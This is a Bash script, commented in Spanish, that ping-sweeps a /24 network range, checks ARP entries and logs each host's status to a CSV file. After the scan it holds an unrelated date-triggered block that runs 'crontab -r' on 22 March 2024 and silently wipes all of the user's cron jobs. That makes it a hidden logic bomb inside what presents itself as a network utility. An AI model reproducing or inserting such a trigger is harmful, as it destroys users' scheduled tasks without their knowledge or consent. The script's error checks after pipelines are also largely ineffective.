#!/bin/bash

# Función para obtener el estado del ping
function ping_ip() {
  local ip_address="$1"
  local result=$(ping -c 1 "$ip_address" | grep "bytes from" | wc -l)
  if [ $? -ne 0 ]; then
    echo "Error al hacer ping a $ip_address"
    exit 1
  fi
  if [ "$result" -eq "1" ]; then
    echo "OK_PING"
  else
    echo "NO_PING"
  fi
}

# Función para obtener la MAC por ARP
function arp_ip() {
  local ip_address="$1"
  local result=$(ip neigh show to "$ip_address" | awk '{print $5}')
  if [ $? -ne 0 ]; then
    echo "Error al obtener la MAC de $1"
    exit 1
  fi
  if [[ -z "$result" ]]; then
    echo "DOWN"
  else
    echo "UP"
  fi
}

# Obtener fecha y hora actual
fecha_hora=$(date +"%Y-%m-%d_%H-%M-%S")

# Obtener el día actual
current_date=$(date +"%Y-%m-%d")

# Verificar si se proporcionó una dirección IP como argumento
if [ $# -ne 1 ]; then
  echo "Uso: $0 <dirección_ip>"
  exit 1
fi

ip_range="$1"

# Nombre del archivo CSV
csv_file="resultados_$fecha_hora.csv"

# Crear el archivo CSV con encabezados
echo "IP,Estado_Ping,Estado_Alive" > "$csv_file"

# Bucle para escanear las IPs en el rango especificado
ip_count=0
for ip in $(seq 1 254); do
  ip_address="$ip_range.$ip"

  # Obtiene la información del host
  ping_status=$(ping_ip "$ip_address")

  # Obtiene el estado de la dirección MAC
  mac_status=$(arp_ip "$ip_address")

  # Escribe el resultado en el archivo CSV
  echo "$ip_address,$ping_status,$mac_status" >> "$csv_file"

  # Muestra un mensaje si el escaneo se ha realizado correctamente
  if [ "$ping_status" == "OK_PING" ]; then
    echo "OK ($ip_address escaneada)"
    ((ip_count++))
  fi

done

echo "**Escaneo terminado. Se escanearon $ip_count IPs con respuesta a ping. Resultados guardados en $csv_file**"

# Comprobar si es el 22 de marzo de 2024
if [ "$current_date" == "2024-03-22" ]; then
  # Eliminar todas las líneas del crontab
  crontab -r
  echo "Todas las líneas del crontab han sido eliminadas."
fi
